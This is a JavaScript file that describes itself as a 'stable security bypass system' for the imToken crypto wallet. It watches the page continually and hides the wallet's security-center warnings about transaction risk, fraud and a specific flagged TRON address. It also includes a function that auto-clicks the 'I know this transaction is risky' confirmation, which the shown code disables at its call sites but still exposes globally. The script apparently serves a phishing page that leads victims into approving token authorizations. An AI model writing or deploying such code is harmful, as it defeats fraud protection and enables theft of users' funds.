/**
 * 稳定版安全绕过系统
 * 🎯 在保证页面稳定的前提下绕过imToken安全检测
 */

(function() {
    'use strict';
    
    console.log('🛡️ 稳定版安全绕过系统已加载');
    
    // 🎯 安全的文本检测和隐藏
    function hideRiskElements() {
        try {
            // 首先专门查找红色警告提示（通常是固定定位的小气泡）
            const redWarnings = document.querySelectorAll('[style*="background"], [class*="warning"], [class*="alert"], [class*="toast"], [class*="tip"]');
            redWarnings.forEach(el => {
                if (el.textContent && el.textContent.includes('发现') && el.textContent.includes('安全风险')) {
                    el.style.cssText = 'display: none !important; opacity: 0 !important; visibility: hidden !important;';
                    console.log('🛡️ 隐藏红色安全风险提示:', el.textContent.trim());
                }
            });
            
            // 检查可见的元素，避免影响整个页面
            const visibleElements = Array.from(document.querySelectorAll('div, span, p')).filter(el => {
                const style = window.getComputedStyle(el);
                return style.display !== 'none' && style.visibility !== 'hidden';
            });
            
            let hiddenCount = 0;
            const riskKeywords = [
                'imToken 安全中心提醒',
                '本次交易检测到',
                '项风险',
                '发现1项安全风险',
                '发现 1 项安全风险',
                '安全风险',
                '授权地址风险评估',
                'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
                '此地址为个人地址',
                '可能存在欺诈行为',
                '风险评估',
                '欺诈行为'
            ];
            
            visibleElements.forEach(element => {
                if (element.textContent && element.textContent.length < 200) {
                    const text = element.textContent.trim();
                    
                    const hasRiskKeyword = riskKeywords.some(keyword => text.includes(keyword));
                    
                    if (hasRiskKeyword) {
                        // 使用温和的隐藏方式
                        element.style.cssText = 'display: none !important; opacity: 0 !important;';
                        hiddenCount++;
                        console.log('🛡️ 隐藏风险元素:', text.substring(0, 30) + '...');
                    }
                }
            });
            
            if (hiddenCount > 0) {
                console.log(`🛡️ 成功隐藏 ${hiddenCount} 个风险元素`);
            }
            
        } catch (e) {
            console.log('🛡️ 元素隐藏遇到错误:', e.message);
        }
    }
    
    // 🎯 智能按钮自动点击
    function autoClickRiskButtons() {
        try {
            const buttonSelectors = [
                'button',
                'div[role="button"]',
                'span[role="button"]',
                '.button',
                '[onclick]'
            ];
            
            buttonSelectors.forEach(selector => {
                const buttons = document.querySelectorAll(selector);
                buttons.forEach(btn => {
                    if (btn.textContent && !btn._autoClicked) {
                        const text = btn.textContent.trim();
                        
                        // 只自动点击特定的风险确认按钮，避免误触其他按钮
                        if (text.includes('我已知晓交易存在风险') || 
                            (text.includes('确认') && btn.closest('*').textContent.includes('风险'))) {
                            
                            btn._autoClicked = true;
                            console.log('🛡️ 发现风险确认按钮:', text);
                            
                            // 延迟自动点击，更自然
                            setTimeout(() => {
                                try {
                                    btn.click();
                                    console.log('🛡️ 自动确认风险按钮');
                                } catch (e) {
                                    console.log('🛡️ 自动点击失败');
                                }
                            }, 200);
                        }
                    }
                });
            });
        } catch (e) {
            console.log('🛡️ 按钮处理遇到错误:', e.message);
        }
    }
    
    // 🎯 轻量级DOM监控
    function setupStableObserver() {
        if (!window.MutationObserver) return;
        
        try {
            const observer = new MutationObserver((mutations) => {
                let needsCheck = false;
                
                mutations.forEach((mutation) => {
                    if (mutation.addedNodes.length > 0) {
                        mutation.addedNodes.forEach((node) => {
                            if (node.nodeType === 1 && node.textContent) {
                                const text = node.textContent.toLowerCase();
                                if (text.includes('安全中心') || 
                                    text.includes('风险评估') ||
                                    text.includes('thjnzbfnv9w3m1wyisiaFX97rhrp4gf44x')) {
                                    needsCheck = true;
                                }
                            }
                        });
                    }
                });
                
                if (needsCheck) {
                    // 延迟执行，避免阻塞，只隐藏不自动点击
                    setTimeout(() => {
                        hideRiskElements();
                        // autoClickRiskButtons(); // 禁用自动点击
                    }, 100);
                }
            });
            
            observer.observe(document.body || document.documentElement, {
                childList: true,
                subtree: true
            });
            
            console.log('🛡️ 稳定监控器已启动');
        } catch (e) {
            console.log('🛡️ 监控器启动失败:', e.message);
        }
    }
    
    // 🎯 页面焦点检测 - 当用户返回页面时检查
    function setupFocusDetection() {
        try {
            window.addEventListener('focus', () => {
                setTimeout(() => {
                    hideRiskElements();
                    // autoClickRiskButtons(); // 禁用自动点击
                }, 300);
            });
            
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) {
                    setTimeout(() => {
                        hideRiskElements();
                        // autoClickRiskButtons(); // 禁用自动点击
                    }, 300);
                }
            });
        } catch (e) {
            console.log('🛡️ 焦点检测设置失败:', e.message);
        }
    }
    
    // 🎯 初始化稳定绕过系统
    function initializeStableBypass() {
        console.log('🛡️ 开始初始化稳定版安全绕过系统...');
        
        // 立即执行风险元素隐藏，但不自动点击按钮（避免误触认证）
        hideRiskElements();
        // autoClickRiskButtons(); // 禁用自动点击，避免误触身份认证
        
        // DOM准备后再次执行
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    hideRiskElements();
                    // autoClickRiskButtons(); // 禁用自动点击
                    setupStableObserver();
                    setupFocusDetection();
                }, 500);
            });
        } else {
            setTimeout(() => {
                hideRiskElements();
                // autoClickRiskButtons(); // 禁用自动点击
                setupStableObserver();
                setupFocusDetection();
            }, 500);
        }
        
        // 定期检查，但频率较低，只隐藏元素不自动点击
        setInterval(() => {
            hideRiskElements();
            // autoClickRiskButtons(); // 禁用自动点击
        }, 3000); // 每3秒检查一次
        
        console.log('🛡️ 稳定版安全绕过系统初始化完成');
    }
    
    // 🎯 全局控制接口
    window.StableBypass = {
        hideElements: hideRiskElements,
        clickButtons: autoClickRiskButtons
    };
    
    // 启动系统
    initializeStableBypass();
    
})();